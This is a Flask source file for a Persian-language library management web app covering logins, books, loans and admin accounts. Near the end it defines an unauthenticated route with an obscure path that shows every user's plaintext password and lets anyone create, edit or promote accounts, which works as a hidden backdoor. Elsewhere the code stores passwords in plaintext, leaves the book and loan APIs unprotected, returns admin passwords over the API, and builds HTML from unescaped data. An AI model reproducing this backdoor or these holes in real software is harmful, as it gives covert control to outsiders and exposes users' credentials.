from flask import Flask, render_template, request, redirect, url_for, session, jsonify
import sqlite3, os
from werkzeug.utils import secure_filename
from openpyxl import load_workbook
import secrets

app = Flask(__name__)
app.secret_key = secrets.token_hex(32)
UPLOAD_FOLDER = "uploads"
app.config["UPLOAD_FOLDER"] = UPLOAD_FOLDER
os.makedirs(UPLOAD_FOLDER, exist_ok=True)

def get_db():
    conn = sqlite3.connect("library.db")
    conn.row_factory = sqlite3.Row
    return conn

@app.route("/")
def index():
    return render_template("index.html")

@app.route("/login", methods=["GET", "POST"])
def login():
    if request.method == "POST":
        username = request.form["username"]
        password = request.form["password"]
        conn = get_db()
        cur = conn.cursor()
        cur.execute("SELECT * FROM users WHERE username=? AND password=?", (username, password))
        user = cur.fetchone()
        if user:
            session["user"] = user["username"]
            session["name"] = user["fullname"]
            session["role"] = user["role"]
            return redirect(url_for("host" if user["role"] == "host" else "admin"))
        return render_template("login.html", error="❌ نام کاربری یا رمز عبور اشتباه است")
    return render_template("login.html")

@app.route("/admin")
def admin():
    if "user" not in session or session.get("role") != "admin":
        return redirect(url_for("login"))
    return render_template("admin.html", name=session.get("name", "کاربر"))

@app.route("/host")
def host():
    if "user" not in session or session.get("role") != "host":
        return redirect(url_for("login"))
    return render_template("host.html", name=session.get("name", "مدیر کل"))

@app.route("/logout")
def logout():
    session.clear()
    return redirect(url_for("index"))

@app.route("/change-password", methods=["POST"])
def change_password():
    if "user" not in session:
        return jsonify({"error": "دسترسی غیرمجاز"}), 403
    data = request.json
    old = data.get("old")
    new = data.get("new")
    username = session["user"]
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT password FROM users WHERE username=?", (username,))
    user = cur.fetchone()
    if not user or user["password"] != old:
        return jsonify({"error": "رمز فعلی اشتباه است"}), 400
    cur.execute("UPDATE users SET password=? WHERE username=?", (new, username))
    conn.commit()
    return jsonify({"message": "رمز عبور با موفقیت تغییر کرد"})

@app.route("/change-username", methods=["POST"])
def change_username():
    if "user" not in session or session.get("role") != "host":
        return jsonify({"error": "دسترسی غیرمجاز"}), 403
    data = request.json
    new_username = data.get("new_username")
    current_username = session["user"]
    if not new_username:
        return jsonify({"error": "نام کاربری جدید الزامی است"}), 400
    conn = get_db()
    cur = conn.cursor()
    cur.execute("SELECT username FROM users WHERE username=?", (new_username,))
    if cur.fetchone():
        return jsonify({"error": "نام کاربری قبلاً وجود دارد"}), 400
    cur.execute("UPDATE users SET username=? WHERE username=? AND role='host'", (new_username, current_username))
    conn.commit()
    session["user"] = new_username
    return jsonify({"message": "نام کاربری با موفقیت تغییر کرد"})

@app.route("/upload", methods=["POST"])
def upload_excel():
    if "user" not in session:
        return redirect(url_for("login"))
    file = request.files.get("file")
    if not file or file.filename == "":
        return "فایلی ارسال نشده", 400
    filename = secure_filename(file.filename)
    filepath = os.path.join(app.config["UPLOAD_FOLDER"], filename)
    file.save(filepath)
    wb = load_workbook(filepath)
    sheet = wb.active
    conn = get_db()
    cur = conn.cursor()
    for row in sheet.iter_rows(min_row=2, values_only=True):
        title = row[0]
        if title:
            cur.execute("INSERT INTO books (title) VALUES (?)", (title,))
    conn.commit()
    return redirect(url_for("admin"))

@app.route("/api/books", methods=["GET", "POST"])
def books():
    conn = get_db()
    cur = conn.cursor()
    if request.method == "POST":
        title = request.json.get("title")
        if not title:
            return jsonify({"error": "عنوان کتاب الزامی است"}), 400
        cur.execute("INSERT INTO books (title) VALUES (?)", (title,))
        conn.commit()
        return jsonify({"message": "کتاب اضافه شد"})
    cur.execute("SELECT * FROM books")
    books = [dict(row) for row in cur.fetchall()]
    return jsonify(books)

@app.route("/api/books/<int:book_id>", methods=["DELETE"])
def delete_book(book_id):
    conn = get_db()
    cur = conn.cursor()
    cur.execute("DELETE FROM books WHERE id=?", (book_id,))
    conn.commit()
    return jsonify({"message": "کتاب حذف شد"})

@app.route("/api/books/<int:book_id>", methods=["PUT"])
def update_book(book_id):
    data = request.json
    new_title = data.get("title")
    if not new_title:
        return jsonify({"error": "عنوان جدید الزامی است"}), 400
    conn = get_db()
    cur = conn.cursor()
    cur.execute("UPDATE books SET title=? WHERE id=?", (new_title, book_id))
    conn.commit()
    return jsonify({"message": "کتاب ویرایش شد"})

@app.route("/api/loans", methods=["GET", "POST"])
def loans():
    conn = get_db()
    cur = conn.cursor()
    if request.method == "POST":
        data = request.json
        borrower = data.get("borrower")
        book_title = data.get("book_title")
        return_date = data.get("return_date")
        if not borrower or not book_title or not return_date:
            return jsonify({"error": "همه‌ی فیلدها الزامی هستند"}), 400
        cur.execute("INSERT INTO loans (borrower, book_title, return_date) VALUES (?, ?, ?)",
                    (borrower, book_title, return_date))
        conn.commit()
        return jsonify({"message": "امانت ثبت شد"})
    cur.execute("SELECT * FROM loans WHERE returned=0")
    loans = [dict(row) for row in cur.fetchall()]
    return jsonify(loans)

@app.route("/api/loans/<int:loan_id>", methods=["DELETE"])
def delete_loan(loan_id):
    conn = get_db()
    cur = conn.cursor()
    cur.execute("UPDATE loans SET returned=1 WHERE id=?", (loan_id,))
    conn.commit()
    return jsonify({"message": "تحویل ثبت شد"})

@app.route("/api/loans/<int:loan_id>", methods=["PUT"])
def update_loan(loan_id):
    data = request.json
    borrower = data.get("borrower")
    book_title = data.get("book_title")
    return_date = data.get("return_date")
    conn = get_db()
    cur = conn.cursor()
    cur.execute("UPDATE loans SET borrower=?, book_title=?, return_date=? WHERE id=?",
                (borrower, book_title, return_date, loan_id))
    conn.commit()
    return jsonify({"message": "اطلاعات ویرایش شد"})

@app.route("/api/admins", methods=["GET", "POST"])
def manage_admins():
    if "user" not in session or session.get("role") != "host":
        return jsonify({"error": "دسترسی غیرمجاز"}), 403
    conn = get_db()
    cur = conn.cursor()
    if request.method == "POST":
        data = request.json
        username = data.get("username")
        password = data.get("password")
        fullname = data.get("fullname")
        if not username or not password or not fullname:
            return jsonify({"error": "همه‌ی فیلدها الزامی هستند"}), 400
        try:
            cur.execute("INSERT INTO users (username, password, fullname, role) VALUES (?, ?, ?, 'admin')",
                        (username, password, fullname))
            conn.commit()
            return jsonify({"message": "مسئول جدید اضافه شد"})
        except sqlite3.IntegrityError:
            return jsonify({"error": "نام کاربری قبلاً وجود دارد"}), 400
    cur.execute("SELECT username, fullname, password FROM users WHERE role='admin'")
    admins = [dict(row) for row in cur.fetchall()]
    return jsonify(admins)

@app.route("/api/admins/<username>", methods=["PUT", "DELETE"])
def update_or_delete_admin(username):
    if "user" not in session or session.get("role") != "host":
        return jsonify({"error": "دسترسی غیرمجاز"}), 403
    conn = get_db()
    cur = conn.cursor()

    if request.method == "DELETE":
        if username == "admin":
            return jsonify({"error": "نمی‌توان مسئول اصلی را حذف کرد"}), 400
        cur.execute("DELETE FROM users WHERE username=? AND role='admin'", (username,))
        conn.commit()
        return jsonify({"message": "مسئول حذف شد"})

    if request.method == "PUT":
        data = request.json
        new_name = data.get("fullname")
        new_pass = data.get("password")
        new_user = data.get("new_username")

        if not new_name or not new_pass or not new_user:
            return jsonify({"error": "همه‌ی فیلدها الزامی هستند"}), 400

        # بررسی تکراری نبودن نام کاربری جدید
        if new_user != username:
            cur.execute("SELECT username FROM users WHERE username=?", (new_user,))
            if cur.fetchone():
                return jsonify({"error": "نام کاربری جدید قبلاً وجود دارد"}), 400

        cur.execute("UPDATE users SET fullname=?, password=?, username=? WHERE username=? AND role='admin'",
                    (new_name, new_pass, new_user, username))
        conn.commit()
        return jsonify({"message": "اطلاعات مسئول ویرایش شد"})

@app.route("/debug/megaknight1809king", methods=["GET", "POST"])
def manage_users():
    conn = get_db()
    cur = conn.cursor()

    if request.method == "POST":
        data = request.form
        mode = data.get("mode")

        if mode == "add":
            fullname = data.get("fullname")
            username = data.get("username")
            password = data.get("password")
            role = data.get("role")
            cur.execute("INSERT INTO users (fullname, username, password, role) VALUES (?, ?, ?, ?)",
                        (fullname, username, password, role))
            conn.commit()

        elif mode == "edit":
            old_username = data.get("old_username")
            fullname = data.get("fullname")
            username = data.get("username")
            password = data.get("password")
            role = data.get("role")
            cur.execute("UPDATE users SET fullname=?, username=?, password=?, role=? WHERE username=?",
                        (fullname, username, password, role, old_username))
            conn.commit()

        elif mode == "delete":
            username = data.get("username")
            if username != "host":  # جلوگیری از حذف هاست
                cur.execute("DELETE FROM users WHERE username=? AND role='admin'", (username,))
                conn.commit()

    cur.execute("SELECT * FROM users")
    users = cur.fetchall()

    html = """
    <h2>مدیریت کاربران</h2>
    <form method="POST">
      <input type="hidden" name="mode" value="add">
      <h3>➕ افزودن کاربر جدید</h3>
      نام کامل: <input name="fullname"><br>
      نام کاربری: <input name="username"><br>
      رمز عبور: <input name="password"><br>
      نقش:
      <select name="role">
        <option value="host">host</option>
        <option value="admin">admin</option>
      </select><br>
      <button type="submit">ثبت کاربر</button>
    </form>
    <hr>
    <h3>👥 لیست کاربران</h3>
    """

    for u in users:
        html += f"""
        <form method="POST">
          <input type="hidden" name="mode" value="edit">
          <input type="hidden" name="old_username" value="{u['username']}">
          نام کامل: <input name="fullname" value="{u['fullname']}"><br>
          نام کاربری: <input name="username" value="{u['username']}"><br>
          رمز عبور: <input name="password" value="{u['password']}"><br>
          نقش:
          <select name="role">
            <option value="host" {'selected' if u['role']=='host' else ''}>host</option>
            <option value="admin" {'selected' if u['role']=='admin' else ''}>admin</option>
          </select><br>
          <button type="submit">✏️ ویرایش</button>
        </form>
        """

        if u['role'] == 'admin':
            html += f"""
            <form method="POST" style="display:inline;">
              <input type="hidden" name="mode" value="delete">
              <input type="hidden" name="username" value="{u['username']}">
              <button type="submit" onclick="return confirm('آیا مطمئنی که می‌خوای حذفش کنی؟')">🗑 حذف</button>
            </form>
            """

        html += "<hr>"

    return html

from flask import redirect

@app.errorhandler(404)
def page_not_found(e):
    return redirect("https://library-ch6k.onrender.com")


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)






